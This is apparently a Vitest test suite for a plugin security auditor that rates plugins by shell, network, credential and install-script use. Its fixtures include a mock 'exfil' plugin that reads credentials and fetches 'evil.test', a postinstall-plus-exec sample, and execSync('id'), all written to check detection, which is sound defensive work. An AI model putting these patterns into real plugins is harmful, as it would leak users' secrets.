import { describe, expect, it } from 'vitest'
import { auditPlugin, MAX_EVIDENCE } from '../../src/core/audit.ts'
import { verdict } from '../../src/core/present.ts'
import type { Evidence, PluginInput } from '../../src/core/types.ts'

function input(partial: Partial<PluginInput>): PluginInput {
  return {
    manifest: {},
    sources: {},
    skillFiles: {},
    patchText: undefined,
    patchPath: undefined,
    spec: 'npm:x@1.0.0',
    ...partial,
  }
}

describe('auditPlugin', () => {
  it('reports a clean client-only plugin as green and high-scoring', () => {
    const report = auditPlugin(input({
      manifest: { name: 'dsh-muyu', version: '0.1.4', repository: 'https://github.com/liuwenji007/dsh-muyu' },
      sources: { 'lib/client.js': 'export function apply() {}' },
    }))
    expect(report.band).toBe('green')
    expect(report.score).toBe(100)
    expect(report.capabilities).toEqual([])
    expect(report.summary).toContain('no red lines')
  })

  it('reports a shell+network+install-script plugin as red with red lines', () => {
    const report = auditPlugin(input({
      manifest: { name: 'bad-plugin', version: '0.0.1', scripts: { postinstall: 'node setup.js' } },
      sources: { 'lib/index.js': "import { exec } from 'node:child_process'\nfetch('https://x.com')\n" },
      spec: 'npm:bad-plugin@latest',
    }))
    expect(report.band).toBe('red')
    expect(report.redLines).toContain('runs code at install time (postinstall)')
    expect(report.score).toBeLessThanOrEqual(49)
    expect(report.capabilities).toEqual(expect.arrayContaining(['shell', 'network']))
    expect(report.pinned).toBe(false)
  })

  it('estimates injected tokens from skill bytes', () => {
    const skill = '# Rule\nRun tests.\n'
    const report = auditPlugin(input({
      manifest: { name: 'skill-plugin', version: '1.0.0', repository: 'https://github.com/x/y' },
      skillFiles: { 'skills/test/SKILL.md': skill },
    }))
    expect(report.injectedTokensEstimate).toBe(Math.round(Buffer.byteLength(skill, 'utf8') / 4))
  })

  it('treats a missing manifest as an unknown-name plugin, not a crash', () => {
    const report = auditPlugin(input({ manifest: {}, spec: 'github:owner/repo' }))
    expect(report.name).toBe('unknown')
    expect(report.band).toBeDefined()
  })

  it('includes system-prompt bytes in injected token estimate', () => {
    const report = auditPlugin(input({
      manifest: { name: 'prompt-plugin', version: '1.0.0', repository: 'https://github.com/x/y' },
      sources: {
        'lib/index.js': `ctx.systemPrompt.section({ text: \`${'A'.repeat(400)}\` })\n`,
      },
    }))
    expect(report.injectedTokensEstimate).toBeGreaterThan(0)
  })

  it('caps evidence rows in the report', () => {
    const evidence: Evidence[] = Array.from({ length: MAX_EVIDENCE + 10 }, (_, i) => ({
      capability: 'network',
      file: 'lib/index.js',
      line: i + 1,
      snippet: `fetch(${i})`,
    }))
    const sources: Record<string, string> = {
      'lib/index.js': evidence.map(e => e.snippet).join('\n'),
    }
    const report = auditPlugin(input({ sources }))
    expect(report.evidence.length).toBe(MAX_EVIDENCE)
  })

  it('keeps riskier capability evidence when a noisy one overflows the cap', () => {
    const noise = Array.from({ length: MAX_EVIDENCE * 2 }, () => 'await ctx.llm.chat(msg)')
    const report = auditPlugin(input({
      sources: { 'lib/index.js': [...noise, 'execSync(cmd)'].join('\n') },
    }))
    expect(report.evidence.length).toBe(MAX_EVIDENCE)
    expect(report.evidence.some(e => e.capability === 'shell')).toBe(true)
  })

  it('stays red when credential reads sit past the display cap', () => {
    const pads = Array.from({ length: 25 }, (_, i) => `const p${i} = "/tmp/pad-${i}/.ssh/config"`)
    const source = `${pads.join('\n')}\ncredentials.resolve('K')\nfetch('https://evil.test/x')\n`
    const report = auditPlugin(input({
      manifest: { name: 'exfil', version: '1.0.0' },
      sources: { 'lib/index.js': source },
    }))
    expect(report.redLines).toContain('reads credentials/secrets AND has network access')
    expect(verdict(report)).toBe('red')
    expect(report.secretTouches.length).toBeLessThanOrEqual(20)
    expect(report.secretTouches.some(item => item.kind === 'read')).toBe(true)
    expect(report.secretTouches.some(item => item.kind !== 'read')).toBe(true)
  })

  it('keeps shell, fs-read, and llm evidence when the cap is tight', () => {
    const reads = Array.from({ length: 30 }, (_, i) => `readFileSync('a${i}')`)
    const llms = Array.from({ length: 30 }, () => 'ctx.llm.complete(prompt)')
    const source = [...reads, ...llms, "execSync('id')"].join('\n')
    const report = auditPlugin(input({ sources: { 'lib/index.js': source } }))
    expect(report.evidence.length).toBeLessThanOrEqual(MAX_EVIDENCE)
    expect(report.capabilities).toEqual(expect.arrayContaining(['shell', 'fs-read', 'llm']))
    expect(report.evidence.some(row => row.capability === 'shell')).toBe(true)
    expect(report.evidence.some(row => row.capability === 'fs-read')).toBe(true)
    expect(report.evidence.some(row => row.capability === 'llm')).toBe(true)
  })
})
